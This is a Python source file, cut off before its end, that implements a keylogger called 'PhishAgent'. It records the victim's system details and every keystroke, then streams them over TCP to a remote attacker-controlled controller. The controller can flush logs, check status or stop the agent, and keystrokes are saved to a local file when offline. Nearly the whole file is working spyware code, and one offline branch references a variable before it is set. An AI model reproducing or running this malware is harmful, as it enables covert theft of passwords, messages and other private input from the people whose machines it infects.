import os
import sys
import json
import time
import socket
import threading
import platform
import shutil
from pathlib import Path

# Try to import pynput. If not installed, it will guide the user.
try:
    from pynput import keyboard
except ImportError:
    print("Error: 'pynput' library is required.")
    print("Run: pip install pynput")
    input("Press Enter to exit...")
    sys.exit(1)

# Configuration
SERVER_HOST = "0.0.0.0"  # This is the agent's local binding
SERVER_PORT = 9999       # Port for local control (optional)
CONTROLLER_IP = "YOUR_CONTROLLER_IP_HERE" # Replace with your Termux/PC IP
CONTROLLER_PORT = 8888   # Port on your controller machine
LOG_FILE = "phish_log.txt"
HEARTBEAT_INTERVAL = 5   # Seconds between heartbeats

class PhishAgent:
    def __init__(self):
        self.system_info = self._gather_system_info()
        self.log_queue = []
        self.running = True
        self.connected = False
        self.socket = None
        self._init_network()

    def _gather_system_info(self):
        """Gathers basic system info to identify the victim."""
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_release": platform.release(),
            "python_version": platform.python_version(),
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }

    def _init_network(self):
        """Initializes the connection to the controller."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((CONTROLLER_IP, CONTROLLER_PORT))
            self.connected = True
            print(f"[Agent] Connected to controller at {CONTROLLER_IP}:{CONTROLLER_PORT}")
            
            # Send initial handshake
            handshake = {
                "type": "handshake",
                "system": self.system_info
            }
            self._send_message(handshake)
            
            # Start network listener thread
            threading.Thread(target=self._network_listener, daemon=True).start()
            
        except Exception as e:
            print(f"[Agent] Failed to connect to controller: {e}")
            print("[Agent] Running in local-only mode. Data will be saved to disk.")
            self.connected = False

    def _send_message(self, data):
        """Sends a JSON message to the controller."""
        if not self.connected or not self.socket:
            return
        try:
            message = json.dumps(data)
            # Prepend length to handle TCP stream framing
            length = len(message)
            header = length.to_bytes(4, byteorder='big')
            self.socket.sendall(header + message.encode('utf-8'))
        except Exception as e:
            print(f"[Agent] Failed to send message: {e}")
            self.connected = False

    def _network_listener(self):
        """Listens for commands from the controller."""
        while self.running and self.connected:
            try:
                # Receive length header
                header = self._recv_exact(4)
                if not header:
                    break
                length = int.from_bytes(header, byteorder='big')
                
                # Receive message
                data = self._recv_exact(length)
                if not data:
                    break
                
                command = json.loads(data.decode('utf-8'))
                self._handle_command(command)
                
            except Exception as e:
                print(f"[Agent] Network listener error: {e}")
                break
        
        print("[Agent] Disconnected from controller.")
        self.connected = False

    def _recv_exact(self, n):
        """Receives exactly n bytes from the socket."""
        data = b''
        while len(data) < n:
            packet = self.socket.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def _handle_command(self, command):
        """Handles commands from the controller."""
        cmd_type = command.get("type")
        
        if cmd_type == "ping":
            self._send_message({"type": "pong"})
        elif cmd_type == "flush":
            # Send all queued logs immediately
            if self.log_queue:
                logs = self.log_queue[:]
                self.log_queue.clear()
                self._send_message({
                    "type": "logs",
                    "data": logs,
                    "count": len(logs)
                })
        elif cmd_type == "exit":
            print("[Agent] Received exit command from controller.")
            self.running = False
        elif cmd_type == "status":
            self._send_message({
                "type": "status",
                "system": self.system_info,
                "queue_size": len(self.log_queue)
            })

    def on_press(self, key):
        """Callback for key press events."""
        if not self.running:
            return
            
        try:
            key_repr = repr(key)
            
            # Handle special keys
            if isinstance(key, keyboard.Key):
                key_name = key.name
            else:
                key_name = key.char
            
            event = {
                "type": "key_press",
                "key": key_name,
                "timestamp": time.time(),
                "iso_time": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            # Add to queue
            self.log_queue.append(event)
            
            # Send immediately if queue is large or for critical keys
            if len(self.log_queue) >= 10 or key_name in ['enter', 'tab', 'esc']:
                self._flush_queue()
                
        except Exception as e:
            print(f"[Agent] Error processing key: {e}")

    def on_release(self, key):
        """Callback for key release events."""
        pass

    def _flush_queue(self):
        """Sends queued logs to the controller."""
        if not self.log_queue:
            return
            
        if self.connected:
            logs = self.log_queue[:]
            self.log_queue.clear()
            self._send_message({
                "type": "logs",
                "data": logs,
                "count": len(logs)
            })
        else:
            # Save to local file if not connected
            self._save_to_local(logs)

    def _save_to_local(self, logs):
        """Saves logs to a local file."""
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                for log in logs:
                    f.write(json.dumps(log) + "\n")
        except Exception as e:
            print(f"[Agent] Error saving to local file: {e}")

    def _heartbeat(self):
        """Sends a heartbeat to keep the connection alive and report status."""
        while self.running:
            time.sleep(HEARTBEAT_INTERVAL)
            if self.connected:
                self._send_message({
                    "type": "heartbeat",
                    "system": self.system_info,
                    "queue_size": len(self.log_queue)
                })
            else:
                # Try to reconnect
                try:
                    self._init_network()
                except Exception:
                    pass

    def start(self):
        """Starts the keylogger and network services."""
        print(f"[Agent] Starting PhishAgent on {self.system_info['os']}...")
        print(f"[Agent] Logging to: {os.path.abspath(LOG_FILE)}
